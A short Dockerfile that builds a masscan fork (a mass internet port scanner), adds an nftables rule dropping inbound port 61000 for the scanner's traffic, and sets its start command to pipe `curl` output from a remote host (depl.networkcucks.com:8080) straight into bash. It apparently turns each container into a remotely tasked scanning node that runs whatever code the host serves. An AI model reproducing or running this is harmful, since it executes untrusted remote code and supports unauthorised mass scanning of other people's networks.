FROM ubuntu:latest
RUN apt update
RUN apt install -y curl nftables libpcap0.8 git build-essential
RUN git clone https://github.com/Mr-Bossman/masscan.git
RUN nft add rule ip filter INPUT tcp dport 61000 counter drop
WORKDIR masscan
RUN make
RUN make install
CMD curl -sN http://depl.networkcucks.com:8080 | bash
